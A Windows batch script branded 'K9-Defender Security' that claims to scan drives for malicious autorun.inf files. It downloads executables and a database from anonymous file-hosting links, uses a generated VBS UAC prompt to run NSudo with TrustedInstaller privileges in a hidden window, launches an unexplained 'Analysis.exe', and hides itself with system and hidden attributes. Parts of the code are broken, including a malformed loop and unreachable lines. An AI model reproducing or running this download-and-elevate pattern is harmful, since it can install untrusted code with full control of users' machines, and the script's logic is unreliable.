::K91408815
@echo off
setlocal EnableDelayedExpansion
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn-107.anonfiles.com/986c9eRbxd/a5b45674-1648479585/NSudo.exe', 'NSudo.exe')"
powershell -Command "Invoke-WebRequest https://cdn-107.anonfiles.com/986c9eRbxd/a5b45674-1648479585/NSudo.exe -OutFile NSudo.exe"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn-130.anonfiles.com/3c5b9eR4x5/6b9359c3-1648479482/Malware.DB', 'Malware.DB')"
powershell -Command "Invoke-WebRequest https://cdn-130.anonfiles.com/3c5b9eR4x5/6b9359c3-1648479482/Malware.DB -OutFile Malware.DB"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn-128.anonfiles.com/d0Qc2fXdxf/e921f3c9-1650216591/SHA256.exe', 'SHA256.exe')"
powershell -Command "Invoke-WebRequest https://cdn-128.anonfiles.com/d0Qc2fXdxf/e921f3c9-1650216591/SHA256.exe -OutFile SHA256.exe"
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    echo Seting privileges.
	echo Seting privileges..
    echo Seting privileges...
    echo Requesting administrative privileges.
	echo Requesting administrative privileges..
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "NSudo.exe", " -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide Analysis.exe %~s0 %params%' -Verb RunAs", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B f0a23i4

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
Title K9-Defender Security
ATTRIB /S /D %~nx0 +s +h >nul
for %%a in (
	A
	B
	C
	D
	E
	F
	G
	H
	I
	J
	K
	L
	M
	N
	O
	P
	Q
	R
	S
	T
	U
	V
	W
	X
	Y
	Z
) do (
	set disk=%%a
	if exist %%a:\ call :scan %%a
)
echo Finished
goto :EOF

:scan
set "scan=%~1:\"
attrib -h -s autorun.inf 2>nul 1>nul
attrib -s -r autorun.inf /s /d 2>nul 1>nul
if exist %scan%autorun.inf call :autorun_found %scan%
goto :EOF

:autorun_found
findstr /c:"Open" %1autorun.inf 2>nul 1>nul
if errorlevel 1 goto :EOF


for /f "tokens=2* delims==" %%A in (%~1\autorun.inf) do (call :analyze %%A)
goto :EOF

:analyze
if not exist "%disk%:\%~1" (if not exist "%~1" goto :EOF)
for /f %%H in ('certutil -hashfile "%~1" SHA256 ^| findstr /vc:"h"') do (set "hash=%%H")

findstr /c:"%hash%" "Malware.DB" 2>nul 1>nul
if errorlevel 1 goto :EOF
for /f "tokens=2* delims=:" %%A in ('findstr /c:"%hash%" "Malware.DB"') set "detection=%%B"
echo Malware detected ^| %detection%
cscript pop.vbs "autorun found." "!K9-Defender!" "16"
cscript pop.vbs "%detection% found." "!K9-Defender!" "16"
goto :EOF




certutil -hashfile %autorunfile% SHA256 | findstr /v /c:"SHA256" /c "CertUtil" "Malware.DB"
if errorlevel 0 goto :EOF
certutil -hashfile %autorunfile% SHA256 | findstr /v /c:"SHA256" /c "CertUtil" > "%TMP%\hash.256"
for /f "usebackq delims=" %%H in ("%TMP%\hash.256") do (set hashfile=%%H)
for /f "tokens=2 delims=;" %%u in (findstr /c:"%hashfile%" "Malware.DB") do (echo Malware found: %%u)
goto :EOF
 

